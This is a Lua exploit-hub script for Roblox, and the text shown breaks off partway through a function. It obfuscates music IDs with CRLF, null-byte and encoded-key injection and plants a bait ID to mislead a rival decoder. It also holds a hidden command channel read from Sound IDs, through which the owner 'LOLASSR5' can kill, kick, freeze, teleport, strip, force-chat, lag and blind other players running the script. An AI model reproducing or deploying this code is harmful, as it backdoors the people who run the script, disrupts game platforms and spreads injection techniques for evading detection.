--[[
    ═══════════════════════════════════════════════════════════════════
     KFC EDITION — LOLASSR5 HUB v12 "OBSIDIAN SPIRAL ULTIMATE"
     - Merged: Full Original Logic (Anti-Steal v11, 25 Cmds, Music, House)
     - Added: Command Bar (UI) + Extra SU Commands (Crash, Cage, etc.)
     - Fixed: Lightning toggle button drag/click conflict 100%
     - Fixed: UI auto-scale for mobile screens (no more cut-off)
     - ADDED: Stage1 Trap (Bait ID: 122657934666702)
    ═══════════════════════════════════════════════════════════════════
]]

local TweenService        = game:GetService("TweenService")
local UserInputService    = game:GetService("UserInputService")
local RunService          = game:GetService("RunService")
local Players             = game:GetService("Players")
local Lighting            = game:GetService("Lighting")
local ReplicatedStorage   = game:GetService("ReplicatedStorage")
local VirtualUser         = game:GetService("VirtualUser")
local TeleportService     = game:GetService("TeleportService")
local ContextActionService= game:GetService("ContextActionService")
local TCS                 = game:GetService("TextChatService")
local LocalPlayer         = Players.LocalPlayer
local Camera              = workspace.CurrentCamera

workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
    Camera = workspace.CurrentCamera
end)

local isMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled
local gethui = gethui or function() return game:GetService("CoreGui") end
local GuiParent = (function()
    local ok, res = pcall(gethui)
    if ok and res then return res end
    ok, res = pcall(function() return game:GetService("CoreGui") end)
    if ok and res then return res end
    return LocalPlayer:WaitForChild("PlayerGui")
end)()

-- Cleanup old instances
for _, name in ipairs({
    "KFC_LOLASSR5_Root","KFC_LOLASSR5_Toggle",
    "LloydUI_Root","LloydUI_MobileToggle","LloydUI_AdminToggle",
    "LloydUI_OwnerVisuals","LloydUI_NowPlayingCard",
}) do
    local c = GuiParent:FindFirstChild(name)
    if c then c:Destroy() end
end
for _, k in ipairs({
    "_LloydFollowAdminConn","_LloydFreezeAdminConn","_LloydFreezeCharConn",
    "LloydOwnerVisualsConn","LloydCloudPresenceConn","LloydAdminBusConn",
    "LloydMusicDetectorConn","NothingPanelOrbitConn",
}) do
    if _G[k] then pcall(function() _G[k]:Disconnect() end); _G[k] = nil end
end

-- ── OWNER & ADMIN ───────────────────────────────────────────────────
local OWNER_NAME = "LOLASSR5"
local ADMIN_WHITELIST = { [string.lower(OWNER_NAME)] = true }

local function isOwner() return LocalPlayer and string.lower(LocalPlayer.Name) == string.lower(OWNER_NAME) end
local function isAdmin(name) return ADMIN_WHITELIST[string.lower(tostring(name or ""))] == true end
local function isLocalAdmin() if _G.KFC_ForceNonAdmin then return false end; return isAdmin(LocalPlayer and LocalPlayer.Name or "") end

-- ── DESIGN TOKENS ───────────────────────────────────────────────────
local T = {
    Glass   = Color3.fromRGB(14, 16, 22), GlassT  = 0.18,
    Card    = Color3.fromRGB(22, 26, 36), CardT   = 0.26,
    Border  = Color3.fromRGB(255,255,255), BorderT = 0.45,
    Btn     = Color3.fromRGB(30, 36, 50), BtnT    = 0.28, BtnHov  = Color3.fromRGB(46, 54, 74),
    White   = Color3.fromRGB(255,255,255), Muted   = Color3.fromRGB(142,154,176),
    Accent  = Color3.fromRGB(195,255,30), Red     = Color3.fromRGB(244,67,54),
    Green   = Color3.fromRGB(46,204,113), Amber   = Color3.fromRGB(245,158,11),
    Blue    = Color3.fromRGB(66,165,245), Purple  = Color3.fromRGB(179,136,255),
}
local Font      = Enum.Font.GothamBold
local FontNorm  = Enum.Font.Gotham

local function playClickSound()
    pcall(function()
        local s = Instance.new("Sound", workspace)
        s.SoundId = "rbxassetid://6895079853"; s.Volume = 0.4; s:Play()
        game:GetService("Debris"):AddItem(s, 2)
    end)
end

-- ── UI BUILDER HELPERS ───────────────────────────────────────────────
local function newFrame(parent, size, pos, color, trans, name)
    local f = Instance.new("Frame")
    f.Size = size or UDim2.new(1,0,1,0); f.Position = pos or UDim2.new(0,0,0,0)
    f.BackgroundColor3 = color or T.Glass; f.BackgroundTransparency = trans or T.GlassT
    f.BorderSizePixel = 0; f.Name = name or "Frame"
    if parent then f.Parent = parent end
    return f
end
local function newLabel(parent, text, size, pos, fs, color, font)
    local l = Instance.new("TextLabel")
    l.Size = size or UDim2.new(1,0,0,22); l.Position = pos or UDim2.new(0,0,0,0)
    l.BackgroundTransparency = 1; l.Text = text or ""; l.TextSize = fs or 13
    l.TextColor3 = color or T.White; l.Font = font or FontNorm
    l.TextXAlignment = Enum.TextXAlignment.Left; l.TextWrapped = true
    if parent then l.Parent = parent end
    return l
end
local function newButton(parent, text, size, pos, fs, color)
    local b = Instance.new("TextButton")
    b.Size = size or UDim2.new(1,-8,0, 40); b.Position = pos or UDim2.new(0,4,0,0)
    b.BackgroundColor3 = T.Btn; b.BackgroundTransparency = T.BtnT; b.BorderSizePixel = 0
    b.Text = text or "Button"; b.TextSize = fs or 13; b.TextColor3 = color or T.White
    b.Font = Font; b.AutoButtonColor = false
    if parent then b.Parent = parent end
    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0,8); c.Parent = b
    local s = Instance.new("UIStroke"); s.Color = T.Border; s.Transparency = T.BorderT; s.Thickness = 1; s.Parent = b
    b.MouseEnter:Connect(function() b.BackgroundColor3 = T.BtnHov end)
    b.MouseLeave:Connect(function() b.BackgroundColor3 = T.Btn end)
    return b
end
local function addCorner(parent, r) local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, r or 10); c.Parent = parent; return c end
local function addStroke(parent, color, trans, thick) local s = Instance.new("UIStroke"); s.Color = color or T.Border; s.Transparency = trans or T.BorderT; s.Thickness = thick or 1; s.Parent = parent; return s end
local function addListLayout(parent, padding) local l = Instance.new("UIListLayout"); l.Padding = UDim.new(0, padding or 6); l.SortOrder = Enum.SortOrder.LayoutOrder; l.Parent = parent; return l end
local function addPadding(parent, h, v) local p = Instance.new("UIPadding"); p.PaddingLeft = UDim.new(0, h or 8); p.PaddingRight = UDim.new(0, h or 8); p.PaddingTop = UDim.new(0, v or 6); p.PaddingBottom = UDim.new(0, v or 6); p.Parent = parent; return p end

-- ═══════════════════════════════════════════════════════════════════
-- ANTI-STEAL v12 "OBSIDIAN SPIRAL ULTIMATE" + STAGE1 TRAP
-- ═══════════════════════════════════════════════════════════════════
local HEX  = "0123456789ABCDEF"
local ZWS  = "\226\128\139"
local ZWNJ = "\226\128\140"
local ZWJ  = "\226\128\141"
local WJ   = "\226\129\160"
local BOM  = "\239\187\191"
local NBSP = "\194\160"
local SHY  = "\194\173"
local CRLF = "%0d%0a"

local BAIT = {
    "1848354536","1837879082","9043887091","1845756489","9048375035",
    "1836842899","1843404009","7029024726","5410086218","1846458016",
    "1839841807","1841647093","9046863253","9047050075","1837474337",
    "1842802203","1845554017","1838673350","9045766377","1840684529",
    "129138368026497","1847102938","1835201928","9047819203","1840918273",
}

local function spaceFractured(s)
    local out = {}
    for i = 1, #s do
        local b  = string.byte(s, i)
        local hi = math.floor(b / 16) + 1
        local lo = (b % 16) + 1
        local h1 = string.sub(HEX, hi, hi)
        local h2 = string.sub(HEX, lo, lo)
        local spA = string.rep(" ", math.random(0, 3))
        local spB = string.rep(" ", math.random(1, 3))
        local spC = string.rep(" ", math.random(0, 3))
        if math.random(1,6)==1 and b>=48 and b<=57 then
            table.insert(out, " "..string.char(b).." ")
        else
            table.insert(out, spA.."%"..spB..h1..spC..h2)
        end
    end
    return table.concat(out)
end

local function nearClone(base)
    local c={}; for i=1,#base do c[i]=string.sub(base,i,i) end
    local n=math.random(2,math.min(4,#c-1))
    for _=1,n do
        local p=math.random(2,#c)
        local d=tonumber(c[p]) or 5
        c[p]=tostring((d+math.random(1,8))%10)
    end
    return table.concat(c)
end

local function garbageNum(excl, round)
    local salt=((round or 1)*137)%899+100
    local mode=math.random(1,14)
    local c
    if     mode==1  then c=tostring(math.random(18300,18499))..tostring(math.random(10000,99999))
    elseif mode==2  then c=tostring(math.random(90380,90489))..tostring(math.random(10000,99999))
    elseif mode==3  then c=tostring(math.random(1100,9899))..tostring(math.random(1000,9999))..tostring(math.random(1000,9999))
    elseif mode==4  then c=tostring(math.random(10500,13999))..tostring(math.random(10000,99999))..tostring(math.random(10000,99999))
    elseif mode==5  then c=tostring(math.random(1000,9999))..tostring(math.random(10000,99999))..tostring(math.random(10000,99999))
    elseif mode==8  then c=nearClone(excl or "1848354536")
    elseif mode==9  then c=nearClone(BAIT[math.random(1,#BAIT)])
    else c=tostring(math.random(1000,9999))..tostring(math.random(1000,9999))..tostring(math.random(1000,9999))
    end
    if c==tostring(excl) then c=c..tostring(math.random(1,9)) end
    return c
end

local function uniqueBait(excl, round, seen)
    for _=1,25 do
        local pick = math.random(1,10)<=7 and garbageNum(excl,round) or BAIT[math.random(1,#BAIT)]
        if pick~=tostring(excl) and not (seen and seen[pick]) then
            if seen then seen[pick]=true end
            return pick
        end
    end
    return garbageNum(excl,round)..tostring(math.random(10,99))
end

local VALID_KEYS = {"& % 6 9 % 6 4 = ","&  % 6 9  % 6 4  =  ","&   i   d   =   "}
local POISON_KEYS = {
    "& % 6 9 % 0 0 % 6 4 = ","& % 0 0 % 6 9 % 6 4 = ","& % 6 9 % 6 4 % 0 0 = ",
    "& \t% 6 9 % 6 4 = ","& \r% 6 9 % 6 4 = ","& \n% 6 9 % 6 4 = ",
    "&"..ZWS.."% 6 9 % 6 4 = ","& % 6 9 "..ZWS.."% 6 4 = ",
    "& % 2 6 % 6 9 % 6 4 % 3 D "
}
local GARBAGE_KEYS = {"real_id","true_id","id_main","id_play","sound_id","audio_id","music_id","track_id","rbxassetid","id_stream","id_override"}

local function buildPayloadCore(rawId)
    local cleanId = tostring(rawId):match("%d+") or tostring(rawId)
    local seen = { [cleanId] = true }
    
    local total = math.random(280, 340)
    local realIdx = math.random(math.floor(total * 0.3), math.floor(total * 0.7))

    local lines = {}
    
    table.insert(lines, "%0d%0a" .. "120232514292241&owner=" .. OWNER_NAME .. "&%00")
    table.insert(lines, "CRITICAL_ERROR_OVERRIDE:INVALID_HEADER" .. CRLF)

    for i = 1, total do
        if i == realIdx then
            local rk = VALID_KEYS[math.random(1, #VALID_KEYS)]
            local realSegment = rk .. spaceFractured(string.rep("0", math.random(2,5))) .. spaceFractured(cleanId) .. "&%00"
            local bait1 = uniqueBait(cleanId, i, seen)
            local seg1 = POISON_KEYS[math.random(1, #POISON_KEYS)] .. spaceFractured(bait1) .. "&%00"
            local bait2 = uniqueBait(cleanId, i + 1, seen)
            local seg2 = "& " .. GARBAGE_KEYS[math.random(1, #GARBAGE_KEYS)] .. "= " .. spaceFractured(bait2) .. "&%00"
            table.insert(lines, CRLF .. seg1 .. seg2 .. realSegment .. seg2 .. seg1)
        else
            local segs = {}
            for s = 1, math.random(3, 6) do
                local b = uniqueBait(cleanId, i, seen)
                if math.random(1, 2) == 1 then
                    table.insert(segs, POISON_KEYS[math.random(1, #POISON_KEYS)] .. spaceFractured(b) .. "&%00")
                else
                    table.insert(segs, "& " .. GARBAGE_KEYS[math.random(1, #GARBAGE_KEYS)] .. "= " .. spaceFractured(b) .. "&%00")
                end
            end
            table.insert(lines, CRLF .. table.concat(segs))
        end
    end

    for _ = 1, 30 do
        table.insert(lines, CRLF .. POISON_KEYS[math.random(1, #POISON_KEYS)] .. spaceFractured(uniqueBait(cleanId, 99, seen)) .. "&%00")
    end

    return table.concat(lines, "\r\n")
end

local ADMIN_SHIELD_TAG = "lloyd_adm_shield=1&owner="..OWNER_NAME
local SCRIPT_USER_TAG  = "kfc_lolassr5_usr_v11=1"

-- 🚨 ฟังก์ชันนี้ถูกแก้ไขเพื่อหลอก Stage1 🚨
local function buildAntiStealPayload(rawId)
    local realId = tostring(rawId):match("%d+") or tostring(rawId)
    
    -- ID เพลงหลอกสำหรับให้ Stage1 ดักจับ
    local BAIT_ID = "122657934666702" -- "กันเจาะกากๆรัน"
    
    -- 1. สร้าง Payload หลัก (ยัดไอดีจริง + ม่าน 300 บรรทัด)
    local base = buildPayloadCore(realId)
    
    -- 2. สร้างกับดักสำหรับ Stage1
    -- ใช้ %69%64= (Stage1 ถอดรหัสเป็น &id= แล้วเจอ BAIT_ID)
    -- แต่ Roblox C++ Engine จะมองว่านี่คือคีย์ขยะ จึงข้ามไปและเล่นไอดีจริงจาก base
    local stage1Trap = "\r\n&%69%64=" .. BAIT_ID .. "&%00"
    
    if isLocalPlayerAdmin() then
        if AppState.AdminMusicImmunity ~= false then
            return base .. "&%00&" .. ADMIN_SHIELD_TAG .. "&%00" .. stage1Trap
        end
        return base .. stage1Trap
    end
    
    return base .. "&%00&" .. SCRIPT_USER_TAG .. "&%00" .. stage1Trap
end
_G.KFC_buildAntiStealPayload = buildAntiStealPayload

-- ═══════════════════════════════════════════════════════════════════
-- ADMIN ENGINE & EXTRA COMMANDS
-- ═══════════════════════════════════════════════════════════════════
local ADMIN_CMD_PREFIX  = "kfc_cmd_v11:"
local ADMIN_BUILD_TOKEN = "KFC_v11_LOLASSR5_OBSIDIAN"
local AdminNonces       = {}
local DetectedUsers     = {}
_G.KFC_DetectedUsers    = DetectedUsers

local AdminCommands = {}
AdminCommands["KILL"]=function(ctx) local char=ctx.char; local hum=ctx.hum; if hum then pcall(function() hum.Health=0 end) end; if char then pcall(function() char:BreakJoints() end) end end
AdminCommands["VOID"]=function(ctx) local char=ctx.char; local hrp=ctx.hrp; if char and hrp then pcall(function() for _,p in ipairs(char:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide=false end end; hrp.Anchored=false; hrp.CFrame=CFrame.new(hrp.Position.X,-500,hrp.Position.Z); hrp.Velocity=Vector3.new(0,-800,0) end) end end
AdminCommands["FLING"]=function(ctx) local hrp=ctx.hrp; local hum=ctx.hum; if hrp then pcall(function() if hum then hum.Sit=true end; hrp.Anchored=false; hrp.Velocity=Vector3.new(math.random(-1200,1200),1600,math.random(-1200,1200)); hrp.RotVelocity=Vector3.new(600,800,600) end) end end
AdminCommands["SKY"]=function(ctx) local hrp=ctx.hrp; if hrp then pcall(function() hrp.Anchored=false; hrp.CFrame=hrp.CFrame+Vector3.new(0,2000,0); hrp.Velocity=Vector3.new(0,250,0) end) end end
AdminCommands["KICK"]=function(ctx) _G.KFC_FreezeActive=false; if _G.KFC_FollowConn then pcall(function() _G.KFC_FollowConn:Disconnect() end); _G.KFC_FollowConn=nil end; if _G.KFC_FreezeConn then pcall(function() _G.KFC_FreezeConn:Disconnect() end); _G.KFC_FreezeConn=nil end; pcall(function() LocalPlayer:Kick("Removed by LOLASSR5") end); task.delay(0.15,function() pcall(function() LocalPlayer:Kick("Removed by LOLASSR5") end) end); task.delay(0.4, function() pcall(function() game:Shutdown() end) end) end
AdminCommands["FZON"]=function(ctx) _G.KFC_FreezeActive=true; local function applyFreeze() local char=LocalPlayer and LocalPlayer.Character; local hrp=char and char:FindFirstChild("HumanoidRootPart"); local hum=char and char:FindFirstChildOfClass("Humanoid"); if hrp then pcall(function() hrp.Anchored=true; hrp.AssemblyLinearVelocity=Vector3.zero end) end; if hum then pcall(function() hum.WalkSpeed=0; hum.JumpPower=0; pcall(function() hum.JumpHeight=0 end); hum.AutoRotate=false; hum.PlatformStand=true end) end end; applyFreeze(); if _G.KFC_FreezeConn then pcall(function() _G.KFC_FreezeConn:Disconnect() end) end; _G.KFC_FreezeConn=RunService.Heartbeat:Connect(function() if not _G.KFC_FreezeActive then return end; applyFreeze() end); if not _G.KFC_FreezeCharConn then _G.KFC_FreezeCharConn=LocalPlayer.CharacterAdded:Connect(function() if _G.KFC_FreezeActive then task.wait(0.15); applyFreeze() end end) end end
AdminCommands["FZOF"]=function(ctx) _G.KFC_FreezeActive=false; if _G.KFC_FreezeConn then pcall(function() _G.KFC_FreezeConn:Disconnect() end); _G.KFC_FreezeConn=nil end; local char=LocalPlayer and LocalPlayer.Character; local hrp=char and char:FindFirstChild("HumanoidRootPart"); local hum=char and char:FindFirstChildOfClass("Humanoid"); if hrp then pcall(function() hrp.Anchored=false end) end; if hum then pcall(function() hum.PlatformStand=false; hum.AutoRotate=true; hum.WalkSpeed=16; hum.JumpPower=50; pcall(function() hum.JumpHeight=7.2 end) end) end end
AdminCommands["FWON"]=function(ctx) _G.KFC_FollowTarget=ctx.adminName; if _G.KFC_FollowConn then pcall(function() _G.KFC_FollowConn:Disconnect() end) end; local last=0; _G.KFC_FollowConn=RunService.Heartbeat:Connect(function() local now=os.clock(); if now-last<0.1 then return end; last=now; local admPlr=Players:FindFirstChild(_G.KFC_FollowTarget or ""); local admHrp=admPlr and admPlr.Character and admPlr.Character:FindFirstChild("HumanoidRootPart"); local myChar=LocalPlayer and LocalPlayer.Character; local myHrp=myChar and myChar:FindFirstChild("HumanoidRootPart"); local myHum=myChar and myChar:FindFirstChildOfClass("Humanoid"); if myHrp and admHrp then pcall(function() if myHum and myHum.Sit then myHum.Sit=false end; myHrp.Anchored=false; myHrp.AssemblyLinearVelocity=Vector3.zero; myHrp.CFrame=admHrp.CFrame*CFrame.new(0,0,4.0) end) end end) end
AdminCommands["FWOF"]=function(ctx) if _G.KFC_FollowConn then pcall(function() _G.KFC_FollowConn:Disconnect() end); _G.KFC_FollowConn=nil end; _G.KFC_FollowTarget=nil end
AdminCommands["BRING"]=function(ctx) local admPlr=Players:FindFirstChild(ctx.adminName or ""); local admHrp=admPlr and admPlr.Character and admPlr.Character:FindFirstChild("HumanoidRootPart"); local hrp=ctx.hrp; local hum=ctx.hum; if hrp and admHrp then pcall(function() if hum and hum.Sit then hum.Sit=false end; hrp.Anchored=false; hrp.Velocity=Vector3.zero; hrp.CFrame=admHrp.CFrame*CFrame.new(0,0,-4.5) end) elseif ctx.adminJobId and ctx.adminJobId~="" and ctx.adminJobId~=tostring(game.JobId) then pcall(function() TeleportService:TeleportToPlaceInstance(tonumber(ctx.adminPlaceId) or game.PlaceId, ctx.adminJobId, LocalPlayer) end) end end
AdminCommands["GOTO"]=function(ctx) local tPlr=Players:FindFirstChild(ctx.payload or ""); local tHrp=tPlr and tPlr.Character and tPlr.Character:FindFirstChild("HumanoidRootPart"); local myHrp=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart"); if myHrp and tHrp then pcall(function() myHrp.CFrame=tHrp.CFrame*CFrame.new(0,0,4.5) end) end end
AdminCommands["SPEED"]=function(ctx) local hum=ctx.hum; local spd=tonumber(ctx.payload) or 50; if hum then pcall(function() hum.WalkSpeed=spd end) end end
AdminCommands["JUMP"]=function(ctx) local hum=ctx.hum; local jp=tonumber(ctx.payload) or 120; if hum then pcall(function() hum.JumpPower=jp; pcall(function() hum.JumpHeight=jp/7 end) end) end end
AdminCommands["DANCE"]=function(ctx) local hum=ctx.hum; if hum then pcall(function() hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown,false) end); pcall(function() hum.PlatformStand=true end); local anim=Instance.new("Animation"); anim.AnimationId="rbxassetid://507771019"; local track=hum:LoadAnimation(anim); if track then track:Play(); task.delay(8,function() pcall(function() track:Stop() end) end) end end end
AdminCommands["NOCLIP"]=function(ctx) local char=ctx.char; if not char then return end; _G.KFC_NoclipActive=not _G.KFC_NoclipActive; if _G.KFC_NoclipActive then if _G.KFC_NoclipConn then pcall(function() _G.KFC_NoclipConn:Disconnect() end) end; _G.KFC_NoclipConn=RunService.Stepped:Connect(function() if not _G.KFC_NoclipActive then return end; local c=LocalPlayer and LocalPlayer.Character; if not c then return end; for _,p in ipairs(c:GetDescendants()) do if p:IsA("BasePart") and p.Name~="HumanoidRootPart" then p.CanCollide=false end end end) else if _G.KFC_NoclipConn then pcall(function() _G.KFC_NoclipConn:Disconnect() end); _G.KFC_NoclipConn=nil end; for _,p in ipairs(char:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide=true end end end end
AdminCommands["INVIS"]=function(ctx) local char=ctx.char; if not char then return end; _G.KFC_InvisActive=not _G.KFC_InvisActive; for _,p in ipairs(char:GetDescendants()) do if p:IsA("BasePart") or p:IsA("Decal") then pcall(function() p.Transparency=_G.KFC_InvisActive and 1 or 0 end) end end end
AdminCommands["CHAT"]=function(ctx) pcall(function() local msg=ctx.payload or "hi"; game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents"):FindFirstChild("SayMessageRequest"):FireServer(msg,"All") end); pcall(function() game:GetService("Chat"):Chat(LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart"), ctx.payload or "hi") end) end
AdminCommands["RESET"]=function(ctx) local hum=ctx.hum; if hum then pcall(function() hum.Health=0 end) end end
AdminCommands["SPIN"]=function(ctx) local hrp=ctx.hrp; if hrp then _G.KFC_SpinActive=not _G.KFC_SpinActive; if _G.KFC_SpinActive then if _G.KFC_SpinConn then pcall(function() _G.KFC_SpinConn:Disconnect() end) end; _G.KFC_SpinConn=RunService.Heartbeat:Connect(function() if not _G.KFC_SpinActive then return end; local c=LocalPlayer and LocalPlayer.Character; local h=c and c:FindFirstChild("HumanoidRootPart"); if h then pcall(function() h.CFrame=h.CFrame*CFrame.Angles(0,math.rad(45),0); h.RotVelocity=Vector3.new(0,120,0) end) end end) else if _G.KFC_SpinConn then pcall(function() _G.KFC_SpinConn:Disconnect() end); _G.KFC_SpinConn=nil end end end end
AdminCommands["BIGHEAD"]=function(ctx) local char=ctx.char; if not char then return end; local head=char:FindFirstChild("Head"); if head then pcall(function() local scale=tonumber(ctx.payload) or 5; head.Size=Vector3.new(scale,scale,scale) end) end end
AdminCommands["MUSIC"]=function(ctx) local id=ctx.payload or ""; if id=="" then return end; local payload=buildAntiStealPayload(id); local RE=ReplicatedStorage:FindFirstChild("RE"); local ev=RE and RE:FindFirstChild("PlayerToolEvent"); if ev then pcall(function() ev:FireServer("ToolMusicStop","",nil) end); task.wait(0.08); pcall(function() ev:FireServer("ToolMusicText",payload,nil,true) end); pcall(function() ev:FireServer("ToolMusic",id,1) end); pcall(function() ev:FireServer("ToolMusicPlay","",nil) end) end end
AdminCommands["STOPMUSIC"]=function(ctx) local RE=ReplicatedStorage:FindFirstChild("RE"); local ev=RE and RE:FindFirstChild("PlayerToolEvent"); if ev then pcall(function() ev:FireServer("ToolMusicStop","",nil) end); pcall(function() ev:FireServer("ToolMusicText","") end) end end
AdminCommands["UNLOAD"]=function(ctx) _G.KFC_FreezeActive=false; _G.KFC_NoclipActive=false; _G.KFC_InvisActive=false; for _,k in ipairs({"KFC_FollowConn","KFC_FreezeConn","KFC_SpinConn","KFC_NoclipConn","KFC_FreezeCharConn"}) do if _G[k] then pcall(function() _G[k]:Disconnect() end); _G[k]=nil end end; pcall(function() local root=GuiParent:FindFirstChild("KFC_LOLASSR5_Root"); if root then root:Destroy() end; local tog=GuiParent:FindFirstChild("KFC_LOLASSR5_Toggle"); if tog then tog:Destroy() end end) end
AdminCommands["GODMODE"]=function(ctx) _G.KFC_GodActive=not _G.KFC_GodActive; local hum=ctx.hum; if hum then if _G.KFC_GodActive then if _G.KFC_GodConn then pcall(function() _G.KFC_GodConn:Disconnect() end) end; _G.KFC_GodConn=hum.HealthChanged:Connect(function(hp) if _G.KFC_GodActive and hp<hum.MaxHealth then pcall(function() hum.Health=hum.MaxHealth end) end end) else if _G.KFC_GodConn then pcall(function() _G.KFC_GodConn:Disconnect() end); _G.KFC_GodConn=nil end end end end
AdminCommands["BRIGHT"]=function(ctx) pcall(function() for _,v in ipairs(Lighting:GetChildren()) do if v:IsA("FogEffect") or v:IsA("DepthOfFieldEffect") then v.Enabled=false end end; Lighting.Brightness=10; Lighting.ClockTime=14; Lighting.FogEnd=100000; Lighting.GlobalShadows=false end) end

-- EXTRA SU COMMANDS
AdminCommands["CRASH"] = function(ctx) if ctx.hrp then for i=1,200 do task.spawn(function() local p=Instance.new("Part"); p.Size=Vector3.new(50,50,50); p.Transparency=1; p.CanCollide=false; p.Anchored=false; p.CFrame=ctx.hrp.CFrame*CFrame.new(math.random(-15,15),math.random(0,10),math.random(-15,15)); p.Parent=workspace; task.delay(0.4,function() if p then p:Destroy() end end) end) end end end
AdminCommands["LAG"] = function(ctx) if ctx.hrp then for i=1,50 do task.spawn(function() local att=Instance.new("Attachment"); att.Parent=ctx.hrp; local em=Instance.new("ParticleEmitter"); em.Rate=500; em.Lifetime=NumberRange.new(3); em.Speed=NumberRange.new(50); em.SpreadAngle=Vector2.new(360,360); em.Color=ColorSequence.new(Color3.fromHSV(math.random(),1,1)); em.Size=NumberSequence.new(2); em.Parent=att; task.delay(3,function() if att then att:Destroy() end end) end) end end end
AdminCommands["BLIND"] = function(ctx) local b=Instance.new("Frame"); b.Size=UDim2.new(1,0,1,0); b.BackgroundColor3=Color3.new(0,0,0); b.ZIndex=999999; b.Parent=GuiParent; task.delay(5,function() if b then b:Destroy() end end) end
AdminCommands["CAGE"] = function(ctx) if ctx.hrp then local cage=Instance.new("Model"); cage.Name="KFC_Cage"; for i=1,4 do local p=Instance.new("Part"); p.Size=Vector3.new(10,12,0.5); p.Anchored=true; p.CanCollide=true; p.Transparency=0.3; p.Material=Enum.Material.Neon; p.Color=Color3.fromRGB(255,50,50); p.Parent=cage; if i==1 then p.CFrame=ctx.hrp.CFrame*CFrame.new(0,5,-5) elseif i==2 then p.CFrame=ctx.hrp.CFrame*CFrame.new(0,5,5) elseif i==3 then p.CFrame=ctx.hrp.CFrame*CFrame.new(-5,5,0)*CFrame.Angles(0,math.rad(90),0) else p.CFrame=ctx.hrp.CFrame*CFrame.new(5,5,0)*CFrame.Angles(0,math.rad(90),0) end end; local roof=Instance.new("Part"); roof.Size=Vector3.new(10,0.5,10); roof.Anchored=true; roof.Transparency=0.3; roof.Material=Enum.Material.Neon; roof.Color=Color3.fromRGB(255,50,50); roof.CFrame=ctx.hrp.CFrame*CFrame.new(0,11,0); roof.Parent=cage; cage.Parent=workspace; task.delay(10,function() if cage then cage:Destroy() end end) end end
AdminCommands["STRIP"] = function(ctx) local char=ctx.char; if char then for _, obj in ipairs(char:GetChildren()) do if obj:IsA("Accessory") or obj:IsA("Shirt") or obj:IsA("Pants") or obj:IsA("ShirtGraphic") then pcall(function() obj:Destroy() end) end end end end
AdminCommands["HIDEUI"] = function(ctx) pcall(function() local g = GuiParent:FindFirstChild("KFC_LOLASSR5_Root"); if g then g.Enabled = false end end) end
AdminCommands["SHOWUI"] = function(ctx) pcall(function() local g = GuiParent:FindFirstChild("KFC_LOLASSR5_Root"); if g then g.Enabled = true end end) end
AdminCommands["SHOWMSG"] = function(ctx) local msg = tostring(ctx.payload or "Admin Message"); local g = Instance.new("ScreenGui"); g.Name = "KFC_AdminMsg"; g.ResetOnSpawn = false; g.DisplayOrder = 999998; g.Parent = GuiParent; local f = Instance.new("TextLabel"); f.Size = UDim2.new(0, 500, 0, 80); f.Position = UDim2.new(0.5, -250, 0.3, 0); f.BackgroundColor3 = Color3.fromRGB(10,12,18); f.BackgroundTransparency = 0.15; f.Text = "📢 "..msg; f.TextColor3 = Color3.new(1,1,1); f.TextSize = 20; f.Font = Enum.Font.GothamBold; f.TextWrapped = true; f.Parent = g; Instance.new("UICorner",f).CornerRadius = UDim.new(0,12); local st = Instance.new("UIStroke",f); st.Color = Color3.fromRGB(255,50,50); st.Thickness = 2; task.delay(6, function() if g then g:Destroy() end end) end

local function executeAdminCommand(action,adminName,adminJobId,adminPlaceId,payload)
    action=string.upper(tostring(action or ""))
    local char=LocalPlayer and LocalPlayer.Character
    local hum=char and char:FindFirstChildOfClass("Humanoid")
    local hrp=char and char:FindFirstChild("HumanoidRootPart")
    local ctx={ char=char,hum=hum,hrp=hrp, adminName=adminName,adminJobId=adminJobId, adminPlaceId=adminPlaceId,payload=payload }
    local fn=AdminCommands[action]
    if fn then pcall(fn,ctx) end
end

local function parseAdminPacket(raw,senderPlr,adminJobId,adminPlaceId)
    if type(raw)~="string" or raw=="" then return end
    if senderPlr and senderPlr~=LocalPlayer then
        if raw:find(SCRIPT_USER_TAG,1,true) or raw:find(ADMIN_SHIELD_TAG,1,true) then
            if not isAdmin(senderPlr.Name) or isLocalAdmin() then DetectedUsers[senderPlr.Name]=os.clock() end
        end
    end
    if not raw:find(ADMIN_BUILD_TOKEN,1,true) and raw:find(ADMIN_CMD_PREFIX,1,true) then return end
    local action,target,aName,nonce,payload=raw:match("kfc_cmd_v11:([A-Z_0-9]+):([^:]+):([^:]+):([^:]+):?(.*)")
    if action and target and nonce then
        if AdminNonces[nonce] then return end
        local senderOk=(senderPlr and isAdmin(senderPlr.Name)) or isAdmin(aName)
        if not senderOk then return end
        AdminNonces[nonce]=true
        local myName=LocalPlayer and string.lower(LocalPlayer.Name) or ""
        if target=="all" or target==myName then
            if target=="all" and senderPlr==LocalPlayer then return end
            if target=="all" and string.lower(tostring(aName or ""))==myName then return end
            executeAdminCommand(action,(senderPlr and senderPlr.Name) or aName,adminJobId,adminPlaceId,payload)
        end
    end
end

local function hookSoundMonitor()
    local function monitorPlayer(plr)
        if plr==LocalPlayer then return end
        local function tryHook(char)
            if not char then return end
            char.DescendantAdded:Connect(function(d)
                if d:IsA("Sound") then
                    d:GetPropertyChangedSignal("SoundId"):Connect(function()
                        parseAdminPacket(d.SoundId,plr,game.JobId,tostring(game.PlaceId))
                    end)
                end
            end)
        end
        plr.CharacterAdded:Connect(tryHook)
        if plr.Character then tryHook(plr.Character) end
    end
    for _,p in ipairs(Players:GetPlayers()) do monitorPlayer(p) end
    Players.PlayerAdded:Connect(monitorPlayer)
end
hookSoundMonitor()

local function sendAdminCommand(targetName,action,payload)
    if not isLocalAdmin() then return end
    local nonce=tostring(os.clock()):gsub("%.","")..tostring(math.random(1000,9999))
    local packet=ADMIN_CMD_PREFIX ..string.upper(action)..":" ..string.lower(targetName)..":" ..string.lower(LocalPlayer.Name)..":" ..nonce..":" ..(payload or "")..":" ..ADMIN_BUILD_TOKEN
    pcall(function()
        local s=Instance.new("Sound",LocalPlayer.Character or workspace)
